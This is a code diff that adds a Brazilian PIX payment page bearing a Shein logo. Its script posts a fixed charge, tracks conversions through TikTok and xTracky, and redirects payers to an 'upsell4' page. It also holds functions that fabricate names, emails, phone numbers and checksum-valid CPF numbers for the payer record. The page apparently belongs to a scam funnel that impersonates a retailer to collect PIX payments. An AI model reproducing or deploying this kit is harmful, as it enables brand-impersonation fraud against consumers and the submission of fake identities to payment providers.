@@ -1,0 +1,536 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script>
+  window.tikTokPixelId = "69307d928c57dbb76a629a89";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.tikTokPixelId = "692a55d87601ebc1d46144b6";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  data-utmify-ignore-iframe
+  data-utmify-prevent-xcod-sck
+  async
+  defer
+></script>
+
+        <!-- TikTok Pixel Code Start -->
+    
+    <!-- TikTok Pixel Code End -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento via PIX</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <script src="js/qrcode.min.js"></script>
+    <link rel="stylesheet" href="css/css.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <img src="images/shein-logo.png" alt="Logo Pagamento PIX" class="logo">
+            <div class="header-subtitle">Transação rápida, segura e sem complicação</div>
+        </div>
+    </header>
+    
+    <div class="container">
+           <div class="payment-container">
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>Ambiente Seguro</span>
+            </div>
+            
+            <div id="loading" class="loading">
+                <div class="spinner"></div>
+                <p>Gerando QRCode para pagamento...</p>
+            </div>
+            
+            <div id="payment-content" style="display: none;">
+                <div class="qrcode-container">
+                    <h2 class="section-title">
+                        <i class="fas fa-mobile-alt"></i>
+                        Escaneie o QRCode abaixo
+                    </h2>
+                    <div id="qrcode"></div>
+                    <!-- Fallback com QuickChart -->
+                    <img id="qrcode-img" style="display: none;" alt="QR Code PIX">
+                </div>
+                
+                <div class="copy-section">
+                    <h2 class="section-title">
+                        <i class="far fa-copy"></i>
+                        Ou copie o código PIX
+                    </h2>
+                    <div class="input-group">
+                        <input type="text" id="pix-code" readonly="">
+                        <button class="copy-btn" id="copy-btn">
+                            <i class="far fa-copy"></i>
+                            <span>Copiar</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="payment-info">
+                    <div class="info-item">
+                        <span class="info-label">
+                            <i class="fas fa-money-bill-wave"></i>
+                            Valor:
+                        </span>
+                        <span id="amount">R$ 0,00</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">
+                            <i class="far fa-clock"></i>
+                            Válido até:
+                        </span>
+                        <span id="expiration">--/--/---- --:--</span>
+                    </div>
+                </div>
+                
+                <div class="trust-badges">
+                    <div class="trust-badge">
+                        <i class="fas fa-shield-alt text-success"></i>
+                        <span>Pagamento Seguro</span>
+                    </div>
+                    <div class="trust-badge">
+                        <i class="fas fa-bolt"></i>
+                        <span>Transação Instantânea</span>
+                    </div>
+                    <div class="trust-badge">
+                        <i class="fas fa-headset"></i>
+                        <span>Suporte 24/7</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="error-message" class="error-message" style="display: none;"></div>
+        </div>
+            
+            <div id="error-message" class="error-message" style="display: none;"></div>
+        </div>
+    
+    
+        <script>
+   // Variáveis globais
+let transactionId = null;
+let checkPaymentInterval = null;
+let retryCount = 0;
+const maxRetries = 3;
+const retryDelay = 2000; // 2 segundos
+
+// Função para extrair parâmetros UTM da URL
+function getUtmParams() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmParams = {};
+    
+    const utmFields = [
+        'utm_source', 'utm_medium', 'utm_campaign', 
+        'utm_term', 'utm_content', 'click_id',
+        'fbclid', 'gclid', 'msclkid', 'ttclid'
+    ];
+    
+    utmFields.forEach(param => {
+        if (urlParams.has(param)) {
+            utmParams[param] = urlParams.get(param);
+        }
+    });
+    
+    return utmParams;
+}
+
+// Função para gerar CPF válido
+function gerarCPF() {
+    let cpf = '';
+    for (let i = 0; i < 9; i++) {
+        cpf += Math.floor(Math.random() * 10);
+    }
+    
+    // Cálculo do primeiro dígito verificador
+    let soma = 0;
+    for (let i = 0; i < 9; i++) {
+        soma += parseInt(cpf.charAt(i)) * (10 - i);
+    }
+    let resto = 11 - (soma % 11);
+    let dv1 = resto > 9 ? 0 : resto;
+    cpf += dv1;
+    
+    // Cálculo do segundo dígito verificador
+    soma = 0;
+    for (let i = 0; i < 10; i++) {
+        soma += parseInt(cpf.charAt(i)) * (11 - i);
+    }
+    resto = 11 - (soma % 11);
+    let dv2 = resto > 9 ? 0 : resto;
+    cpf += dv2;
+    
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+// Função para gerar nome fictício
+function gerarNome() {
+    const nomes = ['Joao', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Mariana', 'Lucas', 'Juliana', 'Fernando', 'Patricia'];
+    const sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Gomes', 'Martins'];
+    
+    
+    const nome = nomes[Math.floor(Math.random() * nomes.length)];
+    const sobrenome1 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+    const sobrenome2 = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+    
+    return `${nome} ${sobrenome1} ${sobrenome2}`;
+}
+
+// Função para gerar e-mail válido
+function gerarEmail(nome) {
+    const provedores = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br', 'icloud.com'];
+    const nomeFormatado = nome.toLowerCase().replace(/\s+/g, '.');
+    const provedor = provedores[Math.floor(Math.random() * provedores.length)];
+    return `${nomeFormatado}@${provedor}`;
+}
+
+// Função para gerar telefone válido
+function gerarTelefone() {
+    const ddd = ['11', '21', '31', '41', '51', '61', '71', '81', '91'];
+    const num = Math.floor(10000000 + Math.random() * 90000000);
+    return `${ddd[Math.floor(Math.random() * ddd.length)]}9${num.toString().substring(1)}`;
+}
+
+// Função para verificar o status do pagamento
+function verificarPagamento(idTransacao) {
+    console.log('Verificando status do pagamento:', idTransacao);
+    
+    return fetch(`../pagamento/verificar.php?id=${encodeURIComponent(idTransacao)}`, {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => {
+        if (!response.ok) {
+            return response.text().then(text => {
+                throw new Error(`HTTP ${response.status}: ${text}`);
+            });
+        }
+        return response.json();
+    })
+    .then(data => {
+        console.log('Resposta do verificar.php:', data);
+        return data;
+    })
+    .catch(error => {
+        console.error('Erro ao verificar pagamento:', error);
+        throw error;
+    });
+}
+
+// Função para iniciar a verificação periódica
+function iniciarVerificacaoPagamento(idTransacao) {
+    console.log('Iniciando verificação periódica para:', idTransacao);
+    
+    checkPaymentInterval = setInterval(() => {
+        verificarPagamento(idTransacao)
+            .then(data => {
+                // Verifica se o pagamento foi aprovado
+                const statusPago = data.status && (
+                    data.status.toLowerCase() === 'paid' || 
+                    data.status.toLowerCase() === 'approved' ||
+                    data.status.toLowerCase() === 'completed'
+                );
+                
+                if (statusPago) {
+                    console.log('✅ Pagamento aprovado! Status:', data.status);
+                    clearInterval(checkPaymentInterval);
+                    
+                    // Obtém o valor do pagamento
+                    const valorCentavos = (data.data && data.data.amount) || 2167;
+                    
+                    // Envia webhook de pagamento aprovado para xTracky
+                    const utmParams = getUtmParams();
+                    sendWebhookToXTracky(idTransacao, valorCentavos, 'paid', utmParams);
+                    
+                    // Envia evento CompletePayment para o TikTok Pixel
+                    if (typeof ttq !== 'undefined') {
+                        ttq.track('CompletePayment', {
+                            content_type: 'product',
+                            content_id: idTransacao,
+                            value: valorCentavos / 100, // Valor em reais
+                            currency: 'BRL'
+                        });
+                        console.log('Evento TikTok CompletePayment enviado');
+                    }
+                    
+                    // Aguarda um pouco antes de redirecionar para garantir que os eventos foram enviados
+                    setTimeout(() => {
+                        window.location.href = '../upsell4/index.html' + window.location.search;
+                    }, 1000);
+                } else {
+                    console.log('⏳ Aguardando pagamento... Status:', data.status);
+                }
+            })
+            .catch(error => console.error('Erro na verificação:', error));
+    }, 5000); // Verifica a cada 5 segundos
+}
+
+
+// Função para exibir mensagens de erro
+function showError(message) {
+    document.getElementById('loading').style.display = 'none';
+    const errorElement = document.getElementById('error-message');
+    errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+    errorElement.style.display = 'block';
+}
+
+// Função para gerar os dados do PIX
+function generatePixData() {
+    const nome = gerarNome();
+    const cpf = gerarCPF();
+    const telefone = gerarTelefone();
+    const email = gerarEmail(nome);
+    
+    return {
+        name: nome,
+        email: email,
+        cpf: cpf.replace(/\D/g, ''),
+        phone: telefone,
+        amount: 1672, 
+        item_title: "Pagamento de Serviço",
+        utmQuery: JSON.stringify(getUtmParams()),
+    };
+}
+
+// Função para enviar webhook para xTracky
+function sendWebhookToXTracky(orderId, amount, status, utmParams) {
+    // Garante que orderId seja uma string válida
+    const orderIdString = String(orderId || '');
+    
+    // Garante que amount seja um número válido
+    const amountNumber = parseInt(amount) || 0;
+    
+    // Constrói o objeto com os campos obrigatórios
+    const webhookData = {
+        orderId: orderIdString,
+        amount: amountNumber,
+        status: status,
+        // utm_source é obrigatório - usa valor da URL ou 'direct' como padrão
+        utm_source: (utmParams && utmParams.utm_source) ? String(utmParams.utm_source) : 'direct'
+    };
+    
+    // Adiciona utm_medium se existir
+    if (utmParams && utmParams.utm_medium) {
+        webhookData.utm_medium = String(utmParams.utm_medium);
+    }
+    
+    // Adiciona utm_campaign se existir
+    if (utmParams && utmParams.utm_campaign) {
+        webhookData.utm_campaign = String(utmParams.utm_campaign);
+    }
+    
+    // Adiciona utm_term se existir
+    if (utmParams && utmParams.utm_term) {
+        webhookData.utm_term = String(utmParams.utm_term);
+    }
+    
+    // Adiciona utm_content se existir
+    if (utmParams && utmParams.utm_content) {
+        webhookData.utm_content = String(utmParams.utm_content);
+    }
+    
+    // Adiciona click_id se existir
+    if (utmParams && utmParams.click_id) {
+        webhookData.click_id = String(utmParams.click_id);
+    }
+    
+    // Adiciona ttclid se existir
+    if (utmParams && utmParams.ttclid) {
+        webhookData.ttclid = String(utmParams.ttclid);
+    }
+    
+    // Adiciona fbclid se existir
+    if (utmParams && utmParams.fbclid) {
+        webhookData.fbclid = String(utmParams.fbclid);
+    }
+    
+    // Adiciona gclid se existir
+    if (utmParams && utmParams.gclid) {
+        webhookData.gclid = String(utmParams.gclid);
+    }
+    
+    console.log('Enviando webhook para xTracky:', webhookData);
+    
+    fetch('https://api.xtracky.com/api/integrations/api', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(webhookData)
+    })
+    .then(response => {
+        console.log('Status da resposta:', response.status);
+        return response.json();
+    })
+    .then(result => {
+        if (result.statusCode === 500 || result.error) {
+            console.error('Erro no webhook xTracky:', result);
+        } else {
+            console.log('Webhook enviado com sucesso:', result);
+        }
+    })
+    .catch(error => {
+        console.error('Erro ao enviar webhook:', error);
+    });
+}
+
+// Função para processar o PIX quando gerado com sucesso
+function handlePixSuccess(data) {
+    console.log('Dados recebidos do servidor:', data);
+    
+    // Adapta para a estrutura correta dos dados
+    transactionId = data.token || data.transactionId || data.id;
+    
+    document.getElementById('loading').style.display = 'none';
+    document.getElementById('payment-content').style.display = 'block';
+    
+    // Formata o valor
+    const valorCentavos = data.valor || data.amount || 0;
+    const amount = (valorCentavos / 100).toLocaleString('pt-BR', {
+        style: 'currency',
+        currency: 'BRL'
+    });
+    document.getElementById('amount').textContent = amount;
+    
+    // Envia webhook de PIX gerado (waiting_payment) para xTracky
+    const utmParams = getUtmParams();
+    sendWebhookToXTracky(transactionId, valorCentavos, 'waiting_payment', utmParams);
+    
+    // Envia evento InitiateCheckout para o TikTok Pixel
+    if (typeof ttq !== 'undefined') {
+        ttq.track('InitiateCheckout', {
+            content_type: 'product',
+            content_id: transactionId,
+            value: valorCentavos / 100, // Valor em reais
+            currency: 'BRL'
+        });
+        console.log('Evento TikTok InitiateCheckout enviado');
+    }
+    
+    // Formata a data de expiração
+    const expirationDate = new Date(Date.now() + 5 * 60000); // 5 minutos a partir de agora
+    const formattedDate = expirationDate.toLocaleString('pt-BR', {
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit'
+    });
+    document.getElementById('expiration').textContent = formattedDate;
+    
+    // Preenche o código PIX
+    const pixCode = data.pixCode || data.pix_qr_code || '';
+    document.getElementById('pix-code').value = pixCode;
+    
+    // Gera o QRCode
+    const qrCodeUrl = data.qrCodeUrl || data.qr_code_url || '';
+    
+    if (qrCodeUrl && qrCodeUrl.startsWith('http')) {
+        // Se tiver URL do QR Code, usa a imagem
+        const qrcodeImg = document.getElementById('qrcode-img');
+        qrcodeImg.src = qrCodeUrl;
+        qrcodeImg.style.display = 'block';
+        document.getElementById('qrcode').style.display = 'none';
+    } else if (pixCode) {
+        // Caso contrário, gera o QR Code a partir do código PIX
+        QRCode.toCanvas(document.getElementById('qrcode'), pixCode, {
+            width: 200,
+            margin: 2,
+            color: {
+                dark: '#000000',
+                light: '#ffffff'
+            }
+        }, function(error) {
+            if (error) {
+                console.error('Erro ao gerar QRCode:', error);
+                const qrcodeImg = document.getElementById('qrcode-img');
+                qrcodeImg.src = `https://quickchart.io/qr?text=${encodeURIComponent(pixCode)}&size=200`;
+                qrcodeImg.style.display = 'block';
+                document.getElementById('qrcode').style.display = 'none';
+            }
+        });
+    }
+    
+    // Configura o botão de copiar
+    document.getElementById('copy-btn').addEventListener('click', function() {
+        const pixCode = document.getElementById('pix-code');
+        pixCode.select();
+        pixCode.setSelectionRange(0, 99999);
+        document.execCommand('copy');
+        
+        const copyBtn = document.getElementById('copy-btn');
+        copyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+        copyBtn.classList.add('copied');
+        
+        setTimeout(function() {
+            copyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>';
+            copyBtn.classList.remove('copied');
+        }, 2000);
+    });
+    
+    if (transactionId) {
+        iniciarVerificacaoPagamento(transactionId);
+    }
+}
+
+// Função para tentar gerar o PIX com retentativas
+function tryGeneratePix(retryCount = 0) {
+    // Captura todos os parâmetros UTM da URL atual
+    const utmParams = getUtmParams();
+    
+    const paymentData = {
+        amount: 2167,
+        ...utmParams  // Espalha os parâmetros UTM diretamente no objeto
+    };
+    
+    console.log('Enviando dados para pagamento.php:', paymentData);
+    
+    fetch('pagamento.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(paymentData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            // Sucesso - processa o PIX
+            handlePixSuccess(data);
+        } else {
+            // Outros erros ou esgotou as tentativas
+            showError(data.error || 'Erro ao gerar o PIX.. Gerando novamente...');
+        }
+    })
+    .catch(error => {
+        console.error('Erro na requisição:', error);
+        showError('Erro ao conectar com o servidor. Tentando novamente...');
+        if (retryCount < maxRetries) {
+            setTimeout(() => tryGeneratePix(retryCount + 1), retryDelay);
+        }
+    });
+}
+
+// Quando o DOM estiver carregado
+document.addEventListener('DOMContentLoaded', function() {
+    // Inicia o processo de geração do PIX
+    tryGeneratePix();
+});
+    </script>
+
+</body></html>
